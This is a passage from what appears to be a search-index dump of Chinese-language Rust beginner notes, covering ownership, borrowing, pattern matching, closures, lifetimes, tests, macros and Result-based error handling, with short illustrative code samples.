<p>\u5bf9\u4e8e\u7b80\u5355\u7684\u7c7b\u578b\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0Copy\u65b9\u6cd5\uff0c\u4f7f\u5176\u5728\u8d4b\u503c\u7684\u65f6\u5019\u81ea\u52a8\u8c03\u7528\u62f7\u8d1d\u8bed\u4e49\u800c\u4e0d\u662f\u79fb\u52a8\u8bed\u4e49\u3002</p> <p>\u51fd\u6570\u8fd4\u56de\u7684\u95ee\u9898</p> <p>\u5bf9\u4e8e\u51fd\u6570\u5185\u90e8\u7684\u4e34\u65f6\u5bf9\u8c61\uff0c\u6211\u4eec\u5141\u8bb8\u5176\u628a\u6240\u6709\u6743\u8f6c\u79fb\u51fa\u53bb\uff0c\u8fd9\u6837\u5176\u751f\u547d\u5468\u671f\u968f\u4e4b\u5ef6\u957f\uff1b\u4f46\u662f\u4e0d\u5141\u8bb8\u5c06\u5176\u5f15\u7528\u8fd4\u56de\u51fa\u53bb\u3002</p> <pre><code>fn get_string1() -&gt; String{\n  let temp = String::from(\"hello world\");\n  return temp;\n}\n\nfn get_string2() -&gt; &amp;str{\n  let temp = String::from(\"hello world\");\n  return &amp;temp;\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#refcell","title":"RefCell \u4e0e \u5f15\u7528\u68c0\u67e5\u7684\u5c40\u9650\u6027","text":"<p>Rust\u65e0\u6cd5\u5bf9\u4e8e\u6211\u4eec\u7684\u5f15\u7528\u505a\u8fd0\u884c\u65f6\u68c0\u67e5\uff0c\u56e0\u6b64\u4f1a\u6709\u8fd9\u6837\u7684\u4ee3\u7801</p> <pre><code>fn main() {\n    let mut t = String::from(\"world\");\n    let mut tt = String::from(\"hello\");\n    let t1;\n    let t2;\n    if true {\n        t1 = &amp;mut t;\n    }else{\n        t1 = &amp;mut tt;\n    }\n    if *t1 == \"world\"{\n        t2 = &amp;mut tt;\n    }else{\n        t2 = &amp;mut t;\n    }\n    println!(\"{}\", *t1);\n    println!(\"{}\", *t2);\n}\n</code></pre> <p>\u8ba9\u6211\u4eec\u6765\u89e3\u91ca\u4e00\u4e0b\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\uff0c\u5f88\u663e\u7136\uff0ct1\u548ct2\u7edd\u5bf9\u4e0d\u53ef\u80fd\u662f\u540c\u4e00\u4e2a\u53d8\u91cf\u7684\u5f15\u7528\uff0c\u4f46\u662f\u7531\u4e8e\u7f16\u8bd1\u5668\u5728\u505a\u9759\u6001\u68c0\u67e5\u7684\u65f6\u5019\u65e0\u6cd5\u5206\u6790\u5206\u652f\u7ed3\u6784\u7684\u7ed3\u679c\uff0c\u5176\u53ea\u80fd\u8ba4\u4e3a\u90fd\u662f\u6709\u53ef\u80fd\u53d1\u751f\u7684\uff0c\u56e0\u6b64\u4f1a\u9009\u62e9\u62a5\u9519\u3002</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#24","title":"2.4 \u590d\u5408\u7c7b\u578b\u548c\u6a21\u5f0f\u5339\u914d","text":"<p>\u6a21\u5f0f\u5339\u914d\u7684\u76ee\u6807\u662f\u786e\u5b9a\u6211\u4eec\u7a77\u5c3d\u6240\u6709\u7684\u53ef\u80fd\u6027\uff0c\u5c24\u5176\u662fOption\u4e2d\u7684None\uff0c\u6a21\u5f0f\u5339\u914d\u8981\u6c42\u6211\u4eec\u4e00\u5b9a\u8981\u5bf9None\u505a\u51fa\u5904\u7406\u3002\u4e0d\u4ec5\u4ec5\u662f\u590d\u5408\u7c7b\u578b\uff0crust\u751a\u81f3\u53ef\u4ee5\u5bf9<code>u8</code>\u200b\u505a\u6a21\u5f0f\u5339\u914d</p> <pre><code>let some_u8_value = 0u8;\nmatch some_u8_value {\n    1 =&gt; println!(\"one\"),\n    3 =&gt; println!(\"three\"),\n    5 =&gt; println!(\"five\"),\n    7 =&gt; println!(\"seven\"),\n    _ =&gt; (),\n}\n</code></pre> <p>\u5176\u4e2d\u7684<code>_</code>\u200b\u662f\u7528\u6765\u5339\u914d\u5176\u4f59\u6240\u6709\u7684\u503c\uff0c\u8fbe\u5230\u5b8c\u5168\u5339\u914d\u7684\u76ee\u6807\uff0c<code>match</code>\u200b\u6784\u6210\u7684\u5339\u914d\uff0c\u4e00\u5b9a\u8981\u8986\u76d6\u6240\u6709\u7684\u60c5\u51b5</p> <p>\u6a21\u5f0f\u5339\u914d\u6700\u5e38\u4f7f\u7528\u7684\u65b9\u5f0f\u5c31\u662f\u9488\u5bf9Option\uff0c\u4ee5\u786e\u4fdd\u5c06None\u7684\u60c5\u51b5\u8003\u8651\u8fdb\u53bb</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#3","title":"3. \u8bed\u53e5\u4e0e\u8868\u8fbe\u5f0f","text":"<p>\u5728\u4e4b\u524d\u7684\u5f88\u591a\u8bed\u8a00\u4e2d\u6211\u4eec\u5e76\u4e0d\u533a\u5206\u8fd9\u4e24\u79cd\u6982\u5ff5\uff0c\u4f46\u662f\u5728\u6709\u51fd\u6570\u5f0f\u7279\u6027\u7684\u8bed\u8a00\u4e2d\u6211\u4eec\u9700\u8981\u5bf9\u4ed6\u4eec\u505a\u51fa\u66f4\u4e25\u683c\u7684\u5b9a\u4e49</p> <ul> <li>statement \u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u64cd\u4f5c\uff0c\u4e0d\u8fd4\u56de\u503c\uff0c\u8981\u52a0\u5206\u53f7</li> <li>expression \u8fd4\u56de\u503c\uff0c\u4e0d\u52a0\u5206\u53f7</li> </ul> <p>\u8bed\u53e5</p> <pre><code>let a = 8 ;\n</code></pre> <p>\u4efb\u4f55\u8bed\u53e5\u4e0d\u80fd\u7ed9\u5176\u4ed6\u4e1c\u897f\u8d4b\u503c\uff0c\u8bed\u53e5\u4e0d\u8fd4\u56de\u4e1c\u897f</p> <p>\u8868\u8fbe\u5f0f</p> <p>\u51fd\u6570\uff0c\u82b1\u62ec\u53f7\uff0c\u6570\u5b66\u8ba1\u7b97\u5f0f\uff0c\u5b8f\u7b49\u7b49\u90fd\u662f\u8868\u8fbe\u5f0f\uff0c\u90fd\u4f1a\u8fd4\u56de\u503c\uff0c\u6bd4\u5982\u8bf4</p> <pre><code>fn main() {\n    let y = {\n        let x = 3;\n        x + 1\n    };\n\n    println!(\"The value of y is: {}\", y);\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#4","title":"4. \u6d41\u7a0b\u63a7\u5236","text":"<p>if-else for while \u7b49\u5e38\u89c4\u7684\u6d41\u7a0b\u63a7\u5236\u8bed\u53e5\u5728Rust\u4e2d\u4ecd\u7136\u6709\u6548\u3002</p> <p>\u4f46\u662fRust\u4e2d\u7ecf\u5e38\u6d89\u53ca\u5230\u5728\u5faa\u73af/\u5206\u652f\u4e2d\u89e3\u6784Option\u7b49\u5bf9\u8c61\uff0c\u4f8b\u5982\u4ee5\u4e0b\u4ee3\u7801</p> <pre><code>impl&lt;T:PartialEq&gt; PartialEq for LinkedList&lt;T&gt; {\n    fn eq(&amp;self, other: &amp;Self) -&gt; bool {\n        if self.size != other.size{\n            false\n        }else{\n            let mut current1: &amp;Option&lt;Box&lt;Node&lt;T&gt;&gt;&gt; = &amp;self.head;\n            let mut current2: &amp;Option&lt;Box&lt;Node&lt;T&gt;&gt;&gt; = &amp;other.head;\n            while let (Some(node1), Some(node2)) = (current1, current2){\n                if node1.value != node2.value {\n                    return false;\n                }\n                current1 = &amp;node1.next;\n                current2 = &amp;node2.next;\n            }\n            return true;\n        }\n    }\n}\n</code></pre> <p>\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c\u53ea\u8981current1\u548ccurrent2\u4e2d\u6709\u4e00\u4e2aNone\uff0c\u5c31\u4f1a\u5bfc\u81f4\u6a21\u5f0f\u5339\u914d\u5931\u8d25\uff0c\u4ece\u800c\u5bfc\u81f4\u5faa\u73af\u9000\u51fa</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#5","title":"5. \u51fd\u6570\u5f0f\u7f16\u7a0b","text":"<pre><code>use std::thread;\nuse std::time::Duration;\n\nfn workout(intensity: u32, random_number: u32) {\n    let action = || {\n        println!(\"muuuu.....\");\n        thread::sleep(Duration::from_secs(2));\n        intensity\n    };\n\n    if intensity &lt; 25 {\n        println!(\n            \"\u4eca\u5929\u6d3b\u529b\u6ee1\u6ee1\uff0c\u5148\u505a {} \u4e2a\u4fef\u5367\u6491!\",\n            action()\n        );\n        println!(\n            \"\u65c1\u8fb9\u6709\u59b9\u5b50\u5728\u770b\uff0c\u4fef\u5367\u6491\u592alow\uff0c\u518d\u6765 {} \u7ec4\u5367\u63a8!\",\n            action()\n        );\n    } else if random_number == 3 {\n        println!(\"\u6628\u5929\u7ec3\u8fc7\u5ea6\u4e86\uff0c\u4eca\u5929\u8fd8\u662f\u4f11\u606f\u4e0b\u5427\uff01\");\n    } else {\n        println!(\n            \"\u6628\u5929\u7ec3\u8fc7\u5ea6\u4e86\uff0c\u4eca\u5929\u5e72\u5e72\u6709\u6c27\uff0c\u8dd1\u6b65 {} \u5206\u949f!\",\n            action()\n        );\n    }\n}\n</code></pre> <p>\u51fd\u6570\u95ed\u5305\uff0c\u53ef\u4ee5\u6709\u6548\u6355\u83b7\u5916\u754c\u7684\u53d8\u91cf\uff0c\u5f53\u4e00\u4e2a\u51fd\u6570\u5728\u591a\u4e2a\u5730\u65b9\u8c03\u7528\u7684\u65f6\u5019\uff0c\u4e3a\u4e86\u907f\u514d\u591a\u6b21\u4fee\u6539\u53c2\u6570\uff0c\u5e94\u5f53\u4f7f\u7528\u51fd\u6570\u95ed\u5305</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u7b80\u5355\u7684\u95ed\u5305</p> <pre><code>let equal_to_x = |z| z == x;\n</code></pre> <p>\u5176\u5b9e\u9645\u7684\u7c7b\u578b\u4e3a<code>Fn(usize) -&gt; bool</code>\u200b\uff0c\u5305\u62ec\u8fd9\u79cd\u7279\u5f81\u5728\u5185\uff0c\u4e00\u5171\u6709\u4e09\u79cd\u4e0d\u540c\u95ed\u5305\u6355\u83b7\u7279\u5f81</p> <ul> <li>Fn \u83b7\u53d6\u6355\u83b7\u53d8\u91cf\u7684\u4e0d\u53ef\u53d8\u5f15\u7528</li> <li>FnMut \u83b7\u53d6\u6355\u83b7\u53d8\u91cf\u7684\u53ef\u53d8\u5f15\u7528</li> <li>FnOnce \u83b7\u53d6\u6355\u83b7\u53d8\u91cf\u7684\u6240\u6709\u6743</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#6","title":"6. \u591a\u7ebf\u7a0b","text":"<ul> <li>todo</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#7","title":"7. \u751f\u547d\u5468\u671f","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#71","title":"7.1 \u51fd\u6570\u4e2d\u7684\u751f\u547d\u5468\u671f","text":"<p>\u6211\u4eec\u6765\u770b\u4e00\u6bb5\u4ee3\u7801</p> <pre><code>fn longest(x:&amp;str, y:&amp;str) -&gt; &amp;str{\n  if x.len() &gt; y.len() {\n    return x;\n  }else{\n    return y;\n  }\n}\n</code></pre> <p>\u8fd9\u6bb5\u4ee3\u7801\u4f1a\u62a5\u9519\u7ed9\u6211\u4eec\uff0c\u7f3a\u5c11\u751f\u547d\u5468\u671f\u6807\u8bb0\uff0c\u539f\u56e0\u5728\u4e8e\u6211\u4eec\u5e76\u4e0d\u6e05\u695a\u8fd4\u56de\u7684\u662fx\u8fd8\u662fy\uff0c\u7f16\u8bd1\u5668\u5728\u7f16\u8bd1\u671f\u4f1a\u65e0\u6cd5\u8fdb\u884c\u751f\u547d\u5468\u671f\u7684\u68c0\u67e5\uff0c\u56e0\u6b64\u9700\u8981\u6211\u4eec\u624b\u52a8\u8fdb\u884c\u6807\u6ce8</p> <p>\u80fd\u591f\u901a\u8fc7\u7f16\u8bd1\u7684\u4ee3\u7801\u5982\u4e0b</p> <pre><code>fn longest&lt;'a&gt;(x:&amp;'a str, y:&amp;'a str) -&gt; &amp;'a str{\n  if x.len() &gt; y.len() {\n    return x;\n  }else{\n    return y;\n  }\n}\nfn main() {\n  let s1 = String::from(\"hello\");\n  let s2 = String::from(\"world!\");\n  let s = longest(&amp;s1, &amp;s2);\n  println!(\"longest is {}\", s);\n}\n</code></pre> <p>\u5b9e\u9645\u4e0a<code>\u2018a</code>\u200b\u7684\u6807\u8bb0\uff0c\u8868\u793a\u8be5\u53d8\u91cf\u7684\u751f\u547d\u5468\u671f\u5e94\u8be5\u5927\u4e8e\u7b49\u4e8e<code>\u2019a</code>\u200b\uff0c\u5c31\u662f\u8868\u793a\u8fd4\u56de\u503c\u7684\u751f\u547d\u5468\u671f\uff0c\u4e0e\u4e24\u4e2a\u53d8\u91cf\u751f\u547d\u5468\u671f\u7684\u6700\u5c0f\u503c\u76f8\u540c</p> <p>\u8fd9\u6837\u7684\u505a\u6cd5\u4f9d\u65e7\u662f\u7c97\u66b4\u7684\uff0c\u56e0\u4e3a\u5904\u4e8e\u7f16\u8bd1\u671f\u7684\u6211\u4eec\u8fd8\u662f\u65e0\u6cd5\u4f7f\u5f97\u751f\u547d\u5468\u671f\u7ed1\u5b9a\u5728\u90a3\u4e2a\u771f\u7684\u8981\u8fd4\u56de\u7684\u503c\u4e0a\u9762\uff0c\u53ea\u80fd\u6bd4\u8f83\u76f4\u63a5\u5730\u7ed1\u5b9a\u5728\u5176\u4e2d\u7684\u8f83\u5c0f\u503c\uff0c\u8fd9\u6837\u4f1a\u5bfc\u81f4\u672c\u8eab\u6ca1\u6709\u95ee\u9898\u7684\u4ee3\u7801\u4e5f\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u6bd4\u5982\u4e0b\u9762\u8fd9\u4e00\u884c</p> <pre><code>fn main() {\n    let string1 = String::from(\"long string is long\");\n    let result;\n    {\n        let string2 = String::from(\"xyz\");\n        result = longest(string1.as_str(), string2.as_str());\n    }\n    println!(\"The longest string is {}\", result); //\u62a5\u9519\n}\n</code></pre> <p>\u200d</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#72","title":"7.2 \u7ed3\u6784\u4f53\u7684\u751f\u547d\u5468\u671f","text":"<p>\u4e4b\u524d\u6211\u4eec\u7684\u7ed3\u6784\u4f53\u4e2d\u90fd\u662f\u5b9e\u9645\u7684\u6210\u5458\u7c7b\u578b\uff0c\u62e5\u6709\u8fd9\u6240\u6709\u6743\uff0c\u901a\u8fc7\u6dfb\u52a0\u751f\u547d\u5468\u671f\u6807\u8bb0\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5f15\u7528\u4f5c\u4e3a\u7ed3\u6784\u4f53\u7684\u6210\u5458</p> <pre><code>struct sentence&lt;'a&gt;{\n  part: &amp;'a str\n}\n\n  let novel = String::from(\"hello. this is a world\");\n  let first_sentence = novel.split('.').next().expect(\"there is no .\");\n  let i = sentence{\n    part: first_sentence\n  };\n</code></pre> <p>\u8be5\u6807\u6ce8\u8868\u793a\uff0c\u8fd9\u4e2a\u5f15\u7528\u7684\u751f\u547d\u5468\u671f\u5e94\u8be5\u6bd4\u8fd9\u4e2a\u7ed3\u6784\u4f53\u8981\u957f\uff0c\u4e8b\u5b9e\u4e5f\u786e\u5b9e\u5982\u6b64\uff0c\u8fd9\u4e2a\u5f15\u7528\u5b9a\u4e49\u5728\u7ed3\u6784\u4f53\u521d\u59cb\u5316\u4e4b\u524d\uff0c\u5982\u679c\u6211\u4eec\u6574\u70b9\u82b1\u6d3b</p> <pre><code>#[derive(Debug)]\nstruct sentence&lt;'a&gt; {\n    part: &amp;'a str,\n}\n\nfn main() {\n    let i;\n    {\n        let novel = String::from(\"Call me Ishmael. Some years ago...\");\n        let first_sentence = novel.split('.').next().expect(\"Could not find a '.'\");\n        i = sentence {\n            part: first_sentence,\n        };\n    }\n    println!(\"{:?}\",i);\n}\n</code></pre> <p>\u7ed3\u6784\u4f53\u5b9e\u73b0\u7684\u751f\u547d\u5468\u671f</p> <pre><code>impl&lt;'a&gt; sentencet&lt;'a&gt; {\n    fn announce_and_return_part(&amp;self, announcement: &amp;str) -&gt; &amp;str {\n        println!(\"Attention please: {}\", announcement);\n        self.part\n    }\n}\n</code></pre> <p>\u8fd9\u91cc\u7684\u751f\u547d\u5468\u671f\u81ea\u52a8\u4ee5self\u4e3a\u51c6\uff0c\u8fd4\u56de\u7684\u4e5f\u6070\u597d\u662fself\u7684\u6210\u5458\u53d8\u91cf\uff0c\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898</p> <p>\u5982\u679c\u6211\u4eec\u8fd9\u91cc\u8fd4\u56deannouncement\u5c31\u4f1a\u62a5\u9519\uff0c\u4f1a\u663e\u793a\u751f\u547d\u5468\u671f\u4e0d\u591f\u957f\uff0c\u5982\u679c\u6211\u4eec\u975e\u8981\u8fd9\u4e48\u505a\u7684\u8bdd\uff0c\u53ef\u4ee5\u8fd9\u4e48\u641e\u4e00\u4e0b\uff0c\u8fd9\u91cc\u7684<code>'a : 'b</code>\u200b\uff0c\u662f\u6211\u4eec\u624b\u52a8\u6807\u8bb0<code>'a</code>\u200b\u7684\u751f\u547d\u5468\u671f\u8981\u957f\u4e8e<code>'b</code>\u200b</p> <pre><code>impl &lt;'a:'b , 'b&gt; sentence&lt;'a&gt; {\n  fn announce_and_return_part(&amp;'a self, announcement: &amp;'b str) -&gt; &amp;'b str {\n      println!(\"Attention please: {}\", announcement);\n      //self.part\n      announcement\n  }\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#73","title":"7.3 \u751f\u547d\u5468\u671f\u6d88\u9664","text":"<p>\u4e00\u822c\u6765\u8bf4\uff0c\u53ea\u8981\u8fd4\u56de\u503c\u91cc\u9762\u6709\u5f15\u7528\uff0c\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528\u751f\u547d\u5468\u671f\u6807\u6ce8\uff0c\u4f46\u662fRust\u7f16\u8bd1\u5668\u505a\u4e86\u4e00\u4e9b\u4f18\u5316\uff0c\u5f15\u5165\u4e86\u4e09\u6761\u6d88\u9664\u89c4\u5219</p> <ul> <li>\u6bcf\u4e2a\u5f15\u7528\u53c2\u6570\u90fd\u6709\u72ec\u7acb\u7684\u751f\u547d\u5468\u671f</li> <li>\u82e5\u53ea\u6709\u4e00\u4e2a\u5f15\u7528\u53c2\u6570\uff0c\u5176\u751f\u547d\u5468\u671f\u4f1a\u8d4b\u503c\u7ed9\u6240\u6709\u7684\u8f93\u51fa\u7684\u5f15\u7528</li> <li>\u82e5\u6709\u591a\u4e2a\u5f15\u7528\u53c2\u6570\uff0c\u4e14\u5176\u4e2d\u4e00\u4e2a\u662f&amp;self\u6216\u8005&amp; mut self\uff0c\u4ee5\u8fd9\u4e24\u79cd\u751f\u547d\u5468\u671f\u4e3a\u51c6\uff0c\u8d4b\u503c\u7ed9\u6240\u6709\u8f93\u51fa\u7684\u5f15\u7528</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#74","title":"7.4 \u9759\u6001\u751f\u547d\u5468\u671f\u6807\u6ce8","text":"<pre><code>let s : &amp;'static str = \"hello world\"; \n</code></pre> <p>\u9759\u6001\u7684\u751f\u547d\u5468\u671f\u6807\u6ce8\uff0c\u8bf4\u660e\u8be5\u53d8\u91cf\u7684\u751f\u547d\u5468\u671f\u548c\u6574\u4e2a\u7a0b\u5e8f\u4e00\u6837\u957f\uff0c\u57fa\u672c\u4e0a\u76f4\u63a5\u6d88\u9664\u4e86\u7f16\u8bd1\u5668\u7684\u751f\u547d\u5468\u671f\u68c0\u67e5\uff0c\u662f\u4e00\u4e2a\u6bd4\u8f83\u5f3a\u5927\u53c8\u5371\u9669\u7684\u6807\u6ce8</p> <p>\u4f46\u662f\u5373\u4fbf\u5982\u6b64\uff0c\u4e5f\u6ca1\u6cd5\u8fd4\u56de\u4e34\u65f6\u53d8\u91cf\uff0c\u4f46\u662f\u5982\u679c\u6ee5\u7528\uff0c\u5728\u4e00\u4e9b\u590d\u6742\u60c5\u5f62\u4e0b\u53ef\u80fd\u8fd8\u662f\u4f1a\u4ea7\u751f\u60ac\u5782\u6307\u9488</p> <pre><code>fn get_string2() -&gt; &amp;'static str{\n  let temp = String::from(\"hello world\");\n  return &amp;temp; //\u62a5\u9519\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#8","title":"8. \u6d4b\u8bd5","text":"<p>\u5982\u4e0b\u662f\u4e00\u4e2aRust\u91cc\u7684\u7b80\u5355\u7684\u6d4b\u8bd5\u6a21\u5757</p> <pre><code>#[cfg(test)]\nmod tests {\n    use super::*; // \u83b7\u53d6\u7236\u6a21\u5757\u4e2d\u7684\u5185\u5bb9\n    #[test]\n    fn test_eq() {\n        let mut list1: LinkedList&lt;u32&gt; = LinkedList::new();\n        let mut list2: LinkedList&lt;u32&gt; = LinkedList::new();\n        assert_eq!(list1==list2, true);\n        for i in 1..12{\n            list1.push_front(i);\n            list2.push_front(i);\n        }\n        assert_eq!(list1==list2, true);\n        list1.pop_front();\n        assert_eq!(list1==list2, false);\n    }\n}\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>cargo test</code>\u200b\u6267\u884c\u5f53\u524d\u9879\u76ee\u7684\u6240\u6709\u6d4b\u8bd5\uff0c\u66f4\u591a\u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u4f1a\u4f7f\u7528<code>cargo test test_eq</code>\u200b \u6765\u6267\u884c\u7279\u5b9a\u7684\u6d4b\u8bd5</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#9","title":"9. \u5b8f","text":"<p>\u5b8f\u7684\u5b58\u5728\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5b9e\u73b0\u4e24\u79cd\u4e3b\u8981\u76ee\u6807</p> <ul> <li>\u5143\u7f16\u7a0b\uff0c\u672c\u8d28\u4e0a\u662f\u81ea\u52a8\u751f\u6210\u4e00\u4e9b\u4ee3\u7801\uff0c\u4f8b\u5982<code>#[derive(Debug)]</code>\u200b\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u81ea\u52a8\u5e2e\u6211\u4eec\u751f\u6210\u76f8\u5e94\u7684\u7279\u5f81\u4ee3\u7801</li> <li>\u53ef\u53d8\u53c2\u6570\uff0cRust\u7684\u51fd\u6570\u672c\u8eab\u4e0d\u652f\u6301\u53ef\u53d8\u53c2\u6570\uff0c\u4f46\u662f\u5b8f\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e00\u70b9</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#91-macro_rules","title":"9.1 macro_rules!","text":"<p>\u8fd9\u79cd\u5b8f\u4e00\u822c\u88ab\u79f0\u4e3a\u58f0\u660e\u5f0f\u5b8f\uff0c\u4e5f\u662f\u6700\u4e3a\u5e38\u89c1\u7684\u5b8f\uff0c\u5176\u672c\u8eab\u548c<code>match</code>\u200b\u8868\u8fbe\u5f0f\u8f83\u4e3a\u63a5\u8fd1</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#10","title":"10. \u9519\u8bef\u5904\u7406","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#101-result","title":"10.1 Result","text":"<p>\u6240\u6709\u7684\u53ef\u6062\u590d\u9519\u8bef\u672c\u8d28\u4e0a\u662f\u9700\u8981\u591a\u4e00\u6761\u5206\u652f\u6765\u5904\u7406\u8fd9\u4e2a\u95ee\u9898\uff0c\u5bf9\u4e8eRust\u7684Result\u7c7b\u578b\uff0c\u6211\u4eec\u5f80\u5f80\u9700\u8981\u91c7\u53d6\u4e00\u4e9b\u624b\u6bb5\u53bb\u5904\u7406</p> <ul> <li>\u200b<code>match</code>\u200b\u5339\u914dResult</li> <li>\u200b<code>unwrap</code>\u200b \u51fa\u95ee\u9898\u5c31\u76f4\u63a5 <code>panic!</code>\u200b</li> <li>\u200b<code>expect(\u7406\u7531)</code>\u200b \u51fa\u95ee\u9898\u5c31<code>panic!</code>\u200b \u5e76\u4e14\u7ed9\u51fa\u76f8\u5e94\u4fe1\u606f</li> </ul> <p>\u4f46\u5728\u7f16\u7a0b\u4e2d\uff0c\u6700\u591a\u7684\u60c5\u51b5\u662f\u6211\u4eec\u5728\u4e00\u4e2a\u51fd\u6570\u4e2d\u9047\u5230\u95ee\u9898\uff0c\u6211\u4eec\u9700\u8981\u628a\u8fd9\u4e2a\u95ee\u9898\u629b\u7ed9\u4e0a\u5c42\u51fd\u6570\u53bb\u89e3\u51b3\uff0c\u4f46\u662f\u5982\u679c\u6bcf\u6b21\u90fd\u7528match\u53bb\u5339\u914d\u7136\u540e\u8fd4\u56de\u7684\u8bdd\u4ee3\u7801\u4f1a\u6bd4\u8f83\u5197\u957f\uff0c\u56e0\u6b64\u5c31\u4ea7\u751f\u4e86\u4e00\u4e2a\u5b8f  <code>\uff1f</code>\u200b</p> <p>\u8fd9\u4e2a\u5b8f\u5c55\u5f00\u4e4b\u540e\u7684\u7ed3\u679c\u5c31\u662f\u548cmatch\u8fd4\u56de\u6548\u679c\u662f\u4e00\u81f4\u7684</p> <pre><code>fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; {\n    let mut f = File::open(\"hello.txt\")?;\n    let mut s = String::new();\n    f.read_to_string(&amp;mut s)?;\n    Ok(s)\n}\nfn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; {\n    // \u6253\u5f00\u6587\u4ef6\uff0cf\u662f`Result&lt;\u6587\u4ef6\u53e5\u67c4,io::Error&gt;`\n    let f = File::open(\"hello.txt\");\n\n    let mut f = match f {\n        // \u6253\u5f00\u6587\u4ef6\u6210\u529f\uff0c\u5c06file\u53e5\u67c4\u8d4b\u503c\u7ed9f\n        Ok(file) =&gt; file,\n        // \u6253\u5f00\u6587\u4ef6\u5931\u8d25\uff0c\u5c06\u9519\u8bef\u8fd4\u56de(\u5411\u4e0a\u4f20\u64ad)\n        Err(e) =&gt; return Err(e),\n    };\n    // \u521b\u5efa\u52a8\u6001\u5b57\u7b26\u4e32s\n    let mut s = String::new();\n    // \u4ecef\u6587\u4ef6\u53e5\u67c4\u8bfb\u53d6\u6570\u636e\u5e76\u5199\u5165s\u4e2d\n    match f.read_to_string(&amp;mut s) {\n        // \u8bfb\u53d6\u6210\u529f\uff0c\u8fd4\u56deOk\u5c01\u88c5\u7684\u5b57\u7b26\u4e32\n        Ok(_) =&gt; Ok(s),\n        // \u5c06\u9519\u8bef\u5411\u4e0a\u4f20\u64ad\n        Err(e) =&gt; Err(e),\n    }\n}\n</code></pre> 